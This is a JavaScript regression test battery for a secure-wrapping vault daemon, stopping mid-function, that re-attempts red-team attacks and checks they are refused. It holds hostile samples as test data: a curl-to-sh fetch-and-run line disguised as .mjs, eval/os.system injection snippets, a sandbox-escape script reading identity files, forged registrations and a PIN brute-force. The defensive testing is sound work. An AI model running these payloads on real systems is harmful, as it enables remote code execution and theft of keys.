// run-tests-v2-phase4.mjs — Phase 4 regression battery: every break
// the red team demonstrated against v2, re-attempted against the
// fixed build. Each case must now REFUSE (or, for the legitimate
// flows the attacks impersonated, still work under the owner's hand).
//
//   FIX 1  socket trust collapse  → S1 (split channels, signed
//          registration, provenance), S2 (confirm code never on a
//          socket), S3 (socket placement + owner channel modes)
//   FIX 2  SOFT cell escape       → S5
//   FIX 3  plaintext-hash oracle  → S4 (v3 commitment + legacy v1)
//   FIX 4  airlock language confusion → S6
//   FIX 5  Tier-2 freshness dead code → S7 (both branches)
//   FIX 6  mesh replay freshness  → S8
//
// Self-contained like the other batteries: own stores, own daemons,
// serial. Run AFTER the other v2 batteries.
import { probeCells } from '../cell.mjs';
import { legacyFixtureHome } from './legacy-v1-fixture.mjs';
import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import net from 'node:net';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import {
  loadIdentity, parseScriptureFile, sealPlaintext, frameDigest, signPayload, signLocalRegister,
  ownerSocketFor, ownerTokenPathFor, ownerConfirmPathFor,
} from '../armor.mjs';
import { scanFile, scanDigestOf, tierParams, loadPolicy, canonicalScanRecord } from '../scan.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.dirname(HERE);
const ARMOR = path.join(ROOT, 'armor.mjs');
const VAULTD = path.join(ROOT, 'vaultd.mjs');
const ARMOR_V1 = path.join(legacyFixtureHome(path.join(os.homedir(), 'workspace', 'scripture-armor-standalone')), 'armor.mjs');
const NODE = process.execPath;

let passed = 0, failed = 0, blocked = 0;
const failures = [];
function check(name, cond, extra = '') {
  if (cond) { passed++; console.log(`  PASS  ${name}`); }
  else { failed++; failures.push(name); console.log(`  FAIL  ${name}${extra ? ` — ${extra}` : ''}`); }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const sha256Hex = (buf) => crypto.createHash('sha256').update(buf).digest('hex');

function run(file, args, opts = {}) {
  const r = spawnSync(NODE, [file, ...args], {
    encoding: 'utf8', timeout: opts.timeout || 120000, input: opts.input,
    cwd: opts.cwd, env: { ...process.env },
  });
  return { code: r.status, out: r.stdout || '', err: r.stderr || '' };
}
const armor = (args, opts) => run(ARMOR, args, opts);
const armorV1 = (args, opts) => run(ARMOR_V1, args, opts);

const BLOCKS = new Map();
function mkStore(label) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `sa2p4-${label}-`));
  const r = armor(['identity', '--label', label, '--identity-dir', dir]);
  if (r.code !== 0) throw new Error(`identity ${label}: ${r.err}`);
  BLOCKS.set(dir, r.out.trim().split('\n').pop());
  return dir;
}
function publicBlockOf(dir) { return BLOCKS.get(dir); }
function trust(storeDir, label, otherDir, meshAddr = null) {
  const args = ['trust', label, publicBlockOf(otherDir), '--identity-dir', storeDir];
  if (meshAddr) args.push('--mesh', meshAddr);
  const r = armor(args);
  if (r.code !== 0) throw new Error(`trust ${label}: ${r.err}`);
}
function trustSelf(storeDir) {
  const me = loadIdentity(storeDir);
  const r = armor(['trust', me.label, publicBlockOf(storeDir), '--identity-dir', storeDir]);
  if (r.code !== 0) throw new Error(`self-trust: ${r.err}`);
}
function writePolicy(storeDir, policy) {
  // The keyless airlock child inherits only PATH: pass reviewed engine paths through its scan policy.
  policy = { ...policy, scan: { ghidra_home: process.env.SCRIPTURE_GHIDRA_HOME || null, jdk_home: process.env.JAVA_HOME || null, ...(policy.scan || {}) } };
  fs.writeFileSync(path.join(storeDir, 'policy.json'), JSON.stringify(policy, null, 2), { mode: 0o600 });
}
function registryOf(storeDir) {
  try { return JSON.parse(fs.readFileSync(path.join(storeDir, 'registry.json'), 'utf8')); }
  catch { return { entries: {} }; }
}
function vaultLog(storeDir) {
  try { return fs.readFileSync(path.join(storeDir, 'vaultd.log'), 'utf8'); } catch { return ''; }
}
async function startDaemon(storeDir, { mesh = false } = {}) {
  const socket = path.join(storeDir, 'vaultd.sock');
  const proc = spawn(NODE, [VAULTD, 'serve', '--identity-dir', storeDir, '--approval-window-ms', '120000'], {
    env: { ...process.env }, stdio: ['ignore', 'pipe', 'pipe'],
  });
  let out = '';
  await new Promise((resolve, reject) => {
    const to = setTimeout(() => reject(new Error(`daemon start timeout: ${out}`)), 20000);
    proc.stdout.on('data', (d) => {
      out += d;
      if (out.includes('vaultd listening') && (!mesh || out.includes('mesh listening'))) { clearTimeout(to); resolve(); }
    });
    proc.on('exit', (c) => { clearTimeout(to); reject(new Error(`daemon exited ${c}: ${out}`)); });
  });
  return { proc, socket, storeDir };
}
async function stopDaemon(d) {
  if (!d || d.proc.exitCode !== null) return;
  d.proc.kill('SIGTERM');
  await new Promise((r) => { d.proc.on('exit', r); setTimeout(r, 5000); });
}
function rpcOnce(socket, obj, timeoutMs = 20000) {
  return new Promise((resolve, reject) => {
    const conn = net.createConnection(socket);
    let buf = '';
    conn.on('connect', () => conn.write(JSON.stringify(obj) + '\n'));
    conn.on('data', (d) => {
      buf += d;
      const i = buf.indexOf('\n');
      if (i >= 0) { try { conn.end(); } catch {} resolve(JSON.parse(buf.slice(0, i))); }
    });
    conn.on('error', reject);
    setTimeout(() => { try { conn.destroy(); } catch {} reject(new Error('rpc timeout')); }, timeoutMs);
  });
}
// FIX 1 client discipline: owner acts ride the owner socket + token.
function ownerRpc(socket, obj, timeoutMs = 20000) {
  let token = '';
  try { token = fs.readFileSync(ownerTokenPathFor(socket), 'utf8').trim(); } catch {}
  return rpcOnce(ownerSocketFor(socket), { ...obj, owner_token: token }, timeoutMs);
}
function readConfirm(socket, id) {
  try { return JSON.parse(fs.readFileSync(ownerConfirmPathFor(socket, id), 'utf8')); } catch { return null; }
}
// Streaming unwrap: .pending resolves at the pend, .final with all msgs.
function present(socket, pkgPath, outName) {
  let pendingResolve; const pending = new Promise((r) => { pendingResolve = r; });
  const final = new Promise((resolve) => {
    const conn = net.createConnection(socket);
    let buf = ''; const msgs = [];
    const done = () => { try { conn.end(); } catch {} resolve(msgs); };
    conn.on('connect', () => conn.write(JSON.stringify({ cmd: 'unwrap', path: pkgPath, out: outName }) + '\n'));
    conn.on('data', (d) => {
      buf += d; let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, i); buf = buf.slice(i + 1);
        if (!line.trim()) continue;
        const m = JSON.parse(line); msgs.push(m);
        if (m.state === 'pending-approval') pendingResolve(m);
        if (m.state === 'unwrapped' || m.beacon || m.ok === false) { setTimeout(done, 50); return; }
      }
    });
    conn.on('error', () => resolve(msgs));
    setTimeout(done, 45000);
  });
  return { pending, final };
}
async function presentAndApprove(socket, pkgPath, outName) {
  const p = present(socket, pkgPath, outName);
  const pend = await p.pending;
  if (pend) await ownerRpc(socket, { cmd: 'approve', id: pend.id });
  const msgs = await p.final;
  return { pend, msgs, last: msgs[msgs.length - 1] };
}
// Streaming activate (cell battery shape).
function activateStream(socket, pkgPath, { entry = null } = {}) {
  const msgs = [];
  let pendingResolve; const pending = new Promise((r) => { pendingResolve = r; });
  const final = new Promise((resolve) => {
    const conn = net.createConnection(socket);
    let buf = '';
    const done = () => { try { conn.end(); } catch {} resolve(msgs); };
    conn.on('connect', () => conn.write(JSON.stringify({ cmd: 'activate', path: pkgPath, entry }) + '\n'));
    conn.on('data', (d) => {
      buf += d; let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        const line = buf.slice(0, i); buf = buf.slice(i + 1);
        if (!line.trim()) continue;
        const m = JSON.parse(line); msgs.push(m);
        if (m.state === 'pending-approval') pendingResolve(m);
        if (m.state === 'activation-complete' || m.ok === false) { setTimeout(done, 60); return; }
      }
    });
    conn.on('error', () => resolve(msgs));
    setTimeout(done, 90000);
  });
  return { pending, final, msgs };
}

async function main() {
  console.log('Scripture Armor v2 — Phase 4 red-team regression battery');
  const W = fs.mkdtempSync(path.join(os.tmpdir(), 'sa2p4-work-'));
  const writePayload = (name, text) => {
    const p = path.join(W, name);
    fs.writeFileSync(p, text);
    return p;
  };

  const A = mkStore('alpha');
  const B = mkStore('bravo');
  const X = mkStore('mallory');
  trust(A, 'bravo', B);
  trust(B, 'alpha', A);
  trust(X, 'bravo', B); // mallory can SEAL to bravo; bravo does NOT trust mallory
  trustSelf(A);
  const idA = loadIdentity(A);
  const idB = loadIdentity(B);
  const idX = loadIdentity(X);
  const dB = await startDaemon(B);
  let dA = null;

  // ================= S1: socket trust collapse =======================
  console.log('\n[S1] FIX 1 — the requester socket holds no owner power');
  {
    // (a) An untrusted identity's signed registration is refused: the
    // signer is not in the recipient's address book.
    const xFile = writePayload('x-msg.txt', 'mallory was here\n');
    const xw = armor(['wrap', xFile, '--to', 'bravo', '--identity-dir', X, '--register-socket', dB.socket]);
    const xCanary = (xw.err.match(/canary:\s+(\S+)/) || [])[1];
    check('untrusted signer registration refused at the recipient daemon',
      xw.code !== 0 && /untrusted-sender/.test(xw.err), xw.err.slice(0, 200));
    check('the untrusted package was never recorded',
      !!xCanary && !registryOf(B).entries[xCanary]);

    // (b) The red team's exact move: one raw unsigned register line.
    const forged = await rpcOnce(dB.socket, {
      cmd: 'register',
      entries: [{
        canary: 'forged-canary-1', digest: 'ab'.repeat(32), digest_kind: 'commit',
        recipient_seal_fp: idB.sealFp, sender_sign_fp: idA.signFp, expiry: null, origin: 'egress',
      }],
    });
    check('unsigned socket register refused (register-unauthenticated)',
      forged.ok === false && /register-unauthenticated/.test(forged.error || ''), JSON.stringify(forged));
    check('the forged entry does not exist', !registryOf(B).entries['forged-canary-1']);

    // (c) A peer-signed registration may not mint activation-store
    // issuances, and may not speak in another identity's name.
    const originDoc = signLocalRegister(idA, [{
      canary: 'forged-canary-2', digest: 'cd'.repeat(32), digest_kind: 'commit',
      recipient_seal_fp: idB.sealFp, sender_sign_fp: idA.signFp, expiry: null, origin: 'activation-store',
    }]);
    const originRes = await rpcOnce(dB.socket, originDoc);
    check('peer-signed activation-store registration refused per-entry',
      originRes.ok === true && originRes.registered === 0
      && (originRes.refused || []).some((r) => /register-origin-refused/.test(r.error || '')),
      JSON.stringify(originRes).slice(0, 220));
    const spoofDoc = signLocalRegister(idA, [{
      canary: 'forged-canary-3', digest: 'ef'.repeat(32), digest_kind: 'commit',
      recipient_seal_fp: idB.sealFp, sender_sign_fp: idB.signFp, expiry: null, origin: 'egress',
    }]);
    const spoofRes = await rpcOnce(dB.socket, spoofDoc);
    check('signed registration claiming another sender refused',
      spoofRes.registered === 0
      && (spoofRes.refused || []).some((r) => /register-sender-mismatch/.test(r.error || '')),
      JSON.stringify(spoofRes).slice(0, 220));

    // (d) The legitimate flow, then every owner act attempted from the
    // requester socket (the red team's S3/O6 list).
    const msgFile = writePayload('hello.txt', 'hello from alpha\n');
    const w = armor(['wrap', msgFile, '--to', 'bravo', '--identity-dir', A, '--register-socket', dB.socket]);
    check('legitimate wrap registers (sender-signed)', w.code === 0, w.err.slice(0, 200));
    const regEntry = Object.values(registryOf(B).entries).find((e) => e.sender_sign_fp === idA.signFp);
    check('the entry records its provenance (sender-signed)',
      !!regEntry && regEntry.registered_via === 'sender-signed', JSON.stringify(regEntry?.registered_via));
    const p = present(dB.socket, `${msgFile}.scripture`, 'hello-back.txt');
    const pend = await p.pending;
    check('presentation pends with truthful provenance',
      !!pend && pend.registry_status === 'issued-by-this-machine'
      && pend.provenance?.via === 'sender-signed' && pend.provenance?.from === idA.signFp,
      JSON.stringify(pend?.provenance));
    const acts = [
      ['approve', { cmd: 'approve', id: pend.id }],
      ['revoke', { cmd: 'revoke', label: 'alpha' }],
      ['revoke-grant', { cmd: 'revoke-grant', canary: 'x' }],
      ['clear-anomaly', { cmd: 'clear-anomaly', canary: 'x' }],
      ['supersede', { cmd: 'supersede', old_canary: 'x', new_canary: 'y' }],
      ['accept-terms', { cmd: 'accept-terms', agent: 'mallory', accept: true, terms_sha256: 'x' }],
      ['mesh-sync', { cmd: 'mesh-sync', to: 'alpha' }],
      ['estate-status', { cmd: 'estate-status' }],
    ];
    for (const [name, req] of acts) {
      const r = await rpcOnce(dB.socket, req);
      check(`requester-socket ${name} refused (owner-channel-required)`,
        r.ok === false && /owner-channel-required/.test(r.error || ''), JSON.stringify(r).slice(0, 160));
    }
    // (e) Public vs owner status.
    const pub = await rpcOnce(dB.socket, { cmd: 'status' });
    check('public status leaks no fingerprints, estate view, or canary lists',
      pub.ok === true && !('seal_fp' in pub) && !('sign_fp' in pub) && !('estate' in pub) && !('reseal_overdue' in pub),
      JSON.stringify(Object.keys(pub)));
    const own = await ownerRpc(dB.socket, { cmd: 'status' });
    check('owner status carries the full view', own.ok === true && own.seal_fp === idB.sealFp);
    // (f) The owner socket itself demands the token.
    const noTok = await rpcOnce(ownerSocketFor(dB.socket), { cmd: 'approve', id: pend.id });
    check('owner socket without the token refused', noTok.ok === false && /owner-auth-required/.test(noTok.error || ''));
    const badTok = await rpcOnce(ownerSocketFor(dB.socket), { cmd: 'approve', id: pend.id, owner_token: 'deadbeef' });
    check('owner socket with a wrong token refused', badTok.ok === false && /owner-auth-required/.test(badTok.error || ''));
    // (g) The owner's own approval still completes the loop.
    const appr = await ownerRpc(dB.socket, { cmd: 'approve', id: pend.id });
    const msgs = await p.final;
    const last = msgs[msgs.length - 1];
    check('owner approval unwraps byte-identical',
      appr.ok === true && last?.state === 'unwrapped'
      && fs.readFileSync(path.join(B, 'out', 'hello-back.txt'), 'utf8') === 'hello from alpha\n',
      JSON.stringify(last).slice(0, 200));

    // (h) Owner-channel registration provenance.
    const sealed = sealPlaintext(Buffer.from('owner-registered bytes\n', 'utf8'), idB, idB, {});
    const pkgPath = writePayload('owner-reg.scripture', sealed.text);
    const regRes = await ownerRpc(dB.socket, {
      cmd: 'register',
      entries: [{
        canary: sealed.frame.canary, digest: frameDigest(sealed.frame), digest_kind: 'commit',
        recipient_seal_fp: idB.sealFp, sender_sign_fp: idB.signFp, expiry: null, origin: 'egress',
      }],
    });
    check('owner-channel registration accepted', regRes.ok === true && regRes.registered === 1, JSON.stringify(regRes));
    const p2 = await presentAndApprove(dB.socket, pkgPath, 'owner-reg-back.txt');
    check('owner-registered package pends with owner provenance and unwraps',
      p2.pend?.provenance?.via === 'owner' && p2.last?.state === 'unwrapped'
      && fs.readFileSync(path.join(B, 'out', 'owner-reg-back.txt'), 'utf8') === 'owner-registered bytes\n',
      JSON.stringify(p2.pend?.provenance));
  }

  // ================= S2: dual approval / confirm code ================
  console.log('\n[S2] FIX 1 — the stage-2 code never rides a socket');
  {
    const evil = writePayload('evil.mjs', 'const x = process.argv[2];\neval(x);\nos.system(x);\n');
    const w = armor(['wrap', evil, '--to', 'bravo', '--override-scan', 'phase4 battery: deliberate dual-approval subject',
      '--identity-dir', A, '--register-socket', dB.socket], { input: 'OVERRIDE\n' });
    check('composite-critical source wraps at Tier 2 under a signed override',
      w.code === 0 && parseScriptureFile(fs.readFileSync(`${evil}.scripture`, 'utf8')).frame.armor_tier === 2,
      w.err.slice(0, 250));
    const p = present(dB.socket, `${evil}.scripture`, 'evil-back.mjs');
    const pend = await p.pending;
    check('Tier-2 presentation pends for DUAL approval', !!pend && pend.approvals_required === 2,
      JSON.stringify(pend?.approvals_required));
    const a1 = await ownerRpc(dB.socket, { cmd: 'approve', id: pend.id });
    const conf = readConfirm(dB.socket, pend.id);
    check('stage 1 records; the response carries NO confirm code',
      a1.ok === true && a1.approved_stage === 1 && !('confirm_code' in a1)
      && !!conf && /^[0-9]{6}$/.test(conf.code) && !JSON.stringify(a1).includes(conf.code),
      JSON.stringify(a1).slice(0, 220));
    const confMode = fs.statSync(ownerConfirmPathFor(dB.socket, pend.id)).mode & 0o777;
    check('the code sits in a 0600 owner-channel state file', confMode === 0o600, `mode=${confMode.toString(8)}`);
    const bad = await ownerRpc(dB.socket, { cmd: 'approve', id: pend.id, confirm: conf.code === '000000' ? '111111' : '000000' });
    check('wrong code refused (dual-confirm-mismatch)', bad.ok === false && /dual-confirm-mismatch/.test(bad.error || ''));
    const atk = await rpcOnce(dB.socket, { cmd: 'approve', id: pend.id, confirm: conf.code });
    check('even the RIGHT code is refused on the requester channel',
      atk.ok === false && /owner-channel-required/.test(atk.error || ''), JSON.stringify(atk).slice(0, 160));
    const a2 = await ownerRpc(dB.socket, { cmd: 'approve', id: pend.id, confirm: conf.code });
    const msgs = await p.final;
    const last = msgs[msgs.length - 1];
    check('owner stage 2 with the out-of-band code unwraps byte-identical',
      a2.ok === true && last?.state === 'unwrapped'
      && fs.readFileSync(path.join(B, 'out', 'evil-back.mjs'), 'utf8') === fs.readFileSync(evil, 'utf8'),
      JSON.stringify(last).slice(0, 200));
  }

  // ================= S3: socket placement ============================
  console.log('\n[S3] FIX 1 rider — socket placement and owner channel modes');
  {
    const od = path.join(B, 'owner');
    check('owner directory is 0700', (fs.statSync(od).mode & 0o777) === 0o700);
    check('owner socket is 0600', (fs.statSync(ownerSocketFor(dB.socket)).mode & 0o777) === 0o600);
    check('owner token file is 0600', (fs.statSync(ownerTokenPathFor(dB.socket)).mode & 0o777) === 0o600);
    check('requester socket is 0600', (fs.statSync(dB.socket).mode & 0o777) === 0o600);
    const sharedSock = path.join(os.tmpdir(), `p4-shared-${process.pid}.sock`);
    const r = spawnSync(NODE, [VAULTD, 'serve', '--identity-dir', B, '--socket', sharedSock],
      { encoding: 'utf8', timeout: 15000 });
    check('a socket path in a shared directory is refused at serve time',
      r.status !== 0 && /not private/.test(r.stderr || ''), (r.stderr || '').slice(0, 200));
  }

  // ================= S4: plaintext-hash oracle + legacy ==============
  console.log('\n[S4] FIX 3 — no offline oracle on the sealed frame; legacy frames stay coherent');
  {
    dA = await startDaemon(A);
    const pin = writePayload('pin.txt', '4821');
    const w = armor(['wrap', pin, '--to', 'bravo', '--identity-dir', A, '--register-socket', dB.socket]);
    check('PIN wraps', w.code === 0, w.err.slice(0, 150));
    const { frame } = parseScriptureFile(fs.readFileSync(`${pin}.scripture`, 'utf8'));
    check('the frame is v4 and carries no sha256 field',
      frame.v === 4 && frame.sha256 === undefined && typeof frame.commit === 'string');
    check('the commitment is not the plaintext hash',
      frame.commit !== sha256Hex(Buffer.from('4821')));
    const fieldValues = new Set(Object.values(frame).filter((v) => typeof v === 'string'));
    let confirmed = null;
    for (let i = 0; i <= 9999 && !confirmed; i++) {
      const cand = String(i).padStart(4, '0');
      if (fieldValues.has(sha256Hex(Buffer.from(cand)))) confirmed = cand;
    }
    check('offline brute force over all 10,000 PINs confirms NOTHING from the artifact',
      confirmed === null, confirmed ? `confirmed ${confirmed}` : '');
    const w2 = armor(['wrap', pin, '--to', 'bravo', '--identity-dir', A, '--register-socket', dB.socket]);
    const frame2 = parseScriptureFile(fs.readFileSync(`${pin}.scripture`, 'utf8')).frame;
    check('two wraps of the same low-entropy plaintext share no digest (unlinkable)',
      w2.code === 0 && frame2.commit !== frame.commit);
    const back = await presentAndApprove(dB.socket, `${pin}.scripture`, 'pin-back.txt');
    check('the v4 PIN package still return-matches and unwraps for its owner',
      back.last?.state === 'unwrapped' && fs.readFileSync(path.join(B, 'out', 'pin-back.txt'), 'utf8') === '4821');

    // Legacy: a v1-wrapped package (the standalone tool) still opens
    // at the v2 daemon — relayed by the OWNER over the owner channel,
    // since v1's unsigned socket registration is exactly what FIX 1
    // removed. Its frame keeps the raw hash: the documented legacy
    // exposure, asserted here so it is never forgotten.
    const V = fs.mkdtempSync(path.join(os.tmpdir(), 'sa2p4-v1store-'));
    const idr = armorV1(['identity', '--label', 'v1-side', '--identity-dir', V]);
    const tr = armorV1(['trust', 'alpha', publicBlockOf(A), '--identity-dir', V]);
    check('v1 side set up', idr.code === 0 && tr.code === 0, (idr.err + tr.err).slice(0, 150));
    const pin2 = writePayload('pin2.txt', '9753');
    const vw = armorV1(['wrap', pin2, '--to', 'alpha', '--socket', dA.socket, '--identity-dir', V]);
    const v1Frame = parseScriptureFile(fs.readFileSync(`${pin2}.scripture`, 'utf8')).frame;
    check('the v1 frame carries the raw plaintext hash (legacy exposure, named)',
      v1Frame.sha256 === sha256Hex(Buffer.from('9753')));
    await ownerRpc(dA.socket, {
      cmd: 'register',
      entries: [{
        canary: v1Frame.canary, digest: v1Frame.sha256, digest_kind: 'sha256',
        recipient_seal_fp: v1Frame.recipient_seal_fp, sender_sign_fp: v1Frame.sender_sign_fp,
        expiry: v1Frame.expiry ?? null, origin: 'egress',
      }],
    });
    const lback = await presentAndApprove(dA.socket, `${pin2}.scripture`, 'pin2-back.txt');
    check('the legacy v1 package return-matches and unwraps at the v2 daemon',
      lback.pend?.registry_status === 'issued-by-this-machine' && lback.last?.state === 'unwrapped'
      && fs.readFileSync(path.join(A, 'out', 'pin2-back.txt'), 'utf8') === '9753',
      JSON.stringify(lback.last).slice(0, 200));
  }

  // ================= S5: SOFT cell escape ============================
  console.log('\n[S5] FIX 2 — the red team escape payload, re-attempted');
  if (probeCells().soft.available) {
  {
    writePolicy(A, { scan: {} });
    const escSrc = [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "import crypto from 'node:crypto';",
      `const STORE = ${JSON.stringify(A)};`,
      "let read = 'unreachable'; let write = 'unreachable';",
      "try { const b = fs.readFileSync(path.join(STORE, 'identity.json')); read = 'READ-' + crypto.createHash('sha256').update(b).digest('hex'); } catch {}",
      "try { fs.readFileSync(path.resolve(process.env.SA_IMAGE, '..', '..', '..', 'identity.json')); read += '|DERIVED-READ'; } catch {}",
      "try { fs.writeFileSync(path.join(STORE, 'CELL-WROTE-HERE.txt'), 'pwned'); write = 'WROTE'; } catch {}",
      "try { fs.writeFileSync('/usr/cell-pwn.txt', 'x'); write += '|ROOTWROTE'; } catch {}",
      "fs.writeFileSync(path.join(process.env.SA_SCRATCH, 'note.txt'), 'scratch-ok');",
      "const self = fs.readFileSync(path.join(process.env.SA_IMAGE, 'escape.mjs'), 'utf8');",
      "console.log('escape-report read=' + read + ' write=' + write + ' selfread=' + (self.includes('escape-report') ? 'ok' : 'fail'));",
      '',
    ].join('\n');
    const esc = writePayload('escape.mjs', escSrc);
    const w = armor(['wrap', esc, '--to', 'alpha', '--for-activation', '--socket', dA.socket, '--identity-dir', A]);
    check('escape payload wraps into the activation store (it scans pass/Tier 0 — like the red team\u2019s)',
      w.code === 0, w.err.slice(0, 250));
    const s = activateStream(dA.socket, `${esc}.scripture`);
    const pend = await s.pending;
    if (pend) await ownerRpc(dA.socket, { cmd: 'approve', id: pend.id });
    const msgs = await s.final;
    const last = msgs[msgs.length - 1];
    const tail = last?.stdout_tail || '';
    const idHash = sha256Hex(fs.readFileSync(path.join(A, 'identity.json')));
    check('the cell ran the payload to completion', last?.state === 'activation-complete' && last?.exit === 0,
      JSON.stringify(last).slice(0, 250));
    check('inside the cell the store is UNREACHABLE (no identity read, direct or derived)',
      tail.includes('read=unreachable') && !tail.includes(idHash), tail.slice(0, 200));
    check('inside the cell, writes outside scratch fail (store + cell root)',
      tail.includes('write=unreachable'), tail.slice(0, 200));
    check('no file was written into the daemon store on the host',
      !fs.existsSync(path.join(A, 'CELL-WROTE-HERE.txt')) && !fs.existsSync('/usr/cell-pwn.txt'));
    check('legitimate in-cell capability intact (image readable, scratch writable)',
      tail.includes('selfread=ok'), tail.slice(0, 200));
  }

  } else { blocked++; console.log('BLOCKED S5: actual SOFT substrate unavailable; confinement and in-cell capability are not proved on this host.'); }
  await stopDaemon(dA); dA = null;
  await stopDaemon(dB);

  console.log(`\n${passed} passed, ${failed} failed (part 1: FIX 1/2/3 core)`);
  if (failures.length) console.log(`failures: ${failures.join(' | ')}`);
  // Part 2 (airlock / freshness / mesh) runs in main2 below.
  await main2({ A, B, X, idA, idB, idX, W, writePayload });
}

function dockOpenStream(socket, profile) {
  const msgs = [];
  let openedResolve; const opened = new Promise((r) => { openedResolve = r; });
  let pendingResolve; const pending = new Promise((r) => { pendingResolve = r; });
  const conn = net.createConnection(socket);
  let buf = '';
  conn.on('connect', () => conn.write(JSON.stringify({ cmd: 'dock-open', profile }) + '\n'));
  conn.on('data', (d) => {
    buf += d; let i;
    while ((i = buf.indexOf('\n')) >= 0) {
      const line = buf.slice(0, i); buf = buf.slice(i + 1);
      if (!line.trim()) continue;
      const m = JSON.parse(line); msgs.push(m);
      if (m.state === 'pending-approval') pendingResolve(m);
      if (m.state === 'session-open') { openedResolve(m); try { conn.end(); } catch {} }
      if (m.ok === false) { openedResolve(m); try { conn.end(); } catch {} }
    }
  });
  conn.on('error', () => {});
  return { pending, opened, msgs, conn };
}
async function openSession(socket, profile) {
  const s = dockOpenStream(socket, profile);
  const pend = await s.pending;
  await ownerRpc(socket, { cmd: 'approve', id: pend.id });
  const opened = await s.opened;
  return { pend, opened, session: opened.session, socketPath: opened.socket };
}
function airlockRecords(storeDir) {
  try {
    return fs.readFileSync(path.join(storeDir, 'airlock.jsonl'), 'utf8').trim().split('\n')
      .filter(Boolean).map((l) => JSON.parse(l));
  } catch { return []; }
}
async function waitAirlock(storeDir, pred, timeoutMs = 60000) {
  const t0 = Date.now();
  for (;;) {
    const hit = airlockRecords(storeDir).find(pred);
    if (hit) return hit;
    if (Date.now() - t0 > timeoutMs) return null;
    await sleep(250);
  }
}
function startPeer(T, name, socketPath, actions) {
  const actionsPath = path.join(T, `${name}-actions.json`);
  const logPath = path.join(T, `${name}-peer.log`);
  fs.writeFileSync(path.join(T, 'peer.mjs'), PEER_SRC);
  fs.writeFileSync(actionsPath, JSON.stringify(actions));
  const proc = spawn(NODE, [path.join(T, 'peer.mjs'), socketPath, actionsPath, logPath], { stdio: ['ignore', 'pipe', 'pipe'] });
  return { proc, logPath };
}
function peerLog(logPath) {
  try { return fs.readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)); }
  catch { return []; }
}
async function waitPeer(logPath, pred, timeoutMs = 30000) {
  const t0 = Date.now();
  for (;;) {
    const hit = peerLog(logPath).find(pred);
    if (hit) return hit;
    if (Date.now() - t0 > timeoutMs) return null;
    await sleep(200);
  }
}
// One raw line to a mesh port; resolves with the parsed response doc.
function meshSend(port, docOrLine) {
  return new Promise((resolve) => {
    const conn = net.createConnection(port, '127.0.0.1');
    let buf = '';
    conn.on('connect', () => conn.write((typeof docOrLine === 'string' ? docOrLine : JSON.stringify(docOrLine)) + '\n'));
    conn.on('data', (d) => {
      buf += d;
      const i = buf.indexOf('\n');
      if (i >= 0) { try { conn.end(); } catch {} try { resolve(JSON.parse(buf.slice(0, i))); } catch { resolve(null); } }
    });
    conn.on('error', () => resolve(null));
    setTimeout(() => { try { conn.destroy(); } catch {} resolve(null); }, 15000);
  });
}

async function main2({ A, B, idA, idB, W, writePayload }) {
  const dA = await startDaemon(A);
  let dB = null;

  // ================= S6: airlock language confusion ==================
  console.log('\n[S6] FIX 4 — the airlock judges content, not clothing');
  {
    writePolicy(A, {
      scan: {},
      airlock: {
        max_message_bytes: 65536, max_session_bytes: 262144, max_messages: 1000,
        idle_s: 120, max_violations: 3,
        profiles: { echo: { classes: ['text', 'data', 'source', 'binary'] } },
      },
    });
    // (a) Shell payload wearing .mjs clothing: shebang + curl|sh.
    const shPayload = writePayload('innocent.mjs', '#!/bin/sh\ncurl http://127.0.0.1:9/p.sh | sh\n');
    const s1 = await openSession(dA.socket, 'echo');
    check('dock session opens for the evasion cases', !!s1.session, JSON.stringify(s1.opened).slice(0, 150));
    startPeer(W, 'p4a', s1.socketPath, [{ sendFile: shPayload }]);
    const q1 = await waitAirlock(A, (r) => r.event === 'crossing' && r.reason_class === 'airlock-scan');
    check('shell payload in .mjs clothing is caught by SHELL rules and quarantined (critical)',
      !!q1 && q1.verdict === 'critical', JSON.stringify(q1));
    check('the shell quarantine raised the airlock-scan beacon',
      vaultLog(A).includes('"reason_class":"airlock-scan"') || vaultLog(A).includes('airlock-scan'));
    // (b) Keyword-less Python: eval(input()) + os.system.
    const pyPayload = writePayload('notes.txt', 'x = eval(input())\nos.system(x)\n');
    const s2 = await openSession(dA.socket, 'echo');
    startPeer(W, 'p4b', s2.socketPath, [{ sendFile: pyPayload }]);
    const q2 = await waitAirlock(A, (r) => r.event === 'crossing' && r.reason_class === 'airlock-scan'
      && r.session === s2.session);
    check('keyword-less Python eval/os.system composes to critical and is quarantined',
      !!q2 && q2.verdict === 'critical', JSON.stringify(q2));
    // (c) Bare subprocess with shell=True: never pass, never data.
    const subPayload = writePayload('tool.py', 'import subprocess\nsubprocess.run("ls", shell=True)\n');
    const s3 = await openSession(dA.socket, 'echo');
    startPeer(W, 'p4c', s3.socketPath, [{ sendFile: subPayload }]);
    const c3 = await waitAirlock(A, (r) => r.event === 'crossing' && r.session === s3.session && !r.reason_class);
    check('bare subprocess shell=True crosses (if at all) as WARN — never pass, never data',
      !!c3 && c3.verdict === 'warn', JSON.stringify(c3));
  }

  // ================= S7: Tier-2 freshness ============================
  console.log('\n[S7] FIX 5 — the freshness gate fires, in both directions');
  {
    writePolicy(A, { scan: {} });
    const policy = loadPolicy(A);
    const evilBytes = fs.readFileSync(writePayload('evil2.mjs', 'const x = process.argv[2];\neval(x);\nos.system(x);\n'));
    const { record } = await scanFile(writePayload('evil2-scan.mjs', evilBytes.toString('utf8')), { policy, storeDir: A });
    check('the freshness subject scans composite-critical (Tier 2)',
      record.verdict === 'critical' && record.risk.tier === 2, `${record.verdict}/${record.risk.tier}`);
    const digest = scanDigestOf(record);
    check('the scan digest is timestamp-free (a re-scan can reproduce it)',
      scanDigestOf({ ...record, started: new Date(Date.now() - 7200e3).toISOString(), duration_ms: 99999 }) === digest);
    const meA = loadIdentity(A);
    const mkCase = async (name, startedIso) => {
      const rec = { ...record, started: startedIso };
      const repSealed = sealPlaintext(Buffer.from(canonicalScanRecord(rec), 'utf8'), meA, meA, {});
